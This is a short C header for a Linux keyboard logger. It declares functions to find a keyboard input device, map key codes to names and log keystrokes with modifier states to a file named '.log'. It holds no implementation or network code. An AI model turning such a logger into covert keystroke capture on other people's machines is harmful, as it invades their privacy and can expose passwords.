#ifndef KEYBOARD_LOGGER_H
#define KEYBOARD_LOGGER_H

#include <linux/input.h>
#include <stdbool.h>
#include <stdio.h>

#define BUFFER_SIZE 256
#define LOG_FILE ".log"

typedef struct {
    const char *normal;
    const char *shifted;
} KeyMap;

const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active);
char *find_keyboard_device(const char *target_device_name);
void log_key(FILE *fp, bool shift_pressed, bool ctrl_pressed, bool meta_pressed, bool alt_pressed, bool log_to_file,
             const char *key_name);

#endif
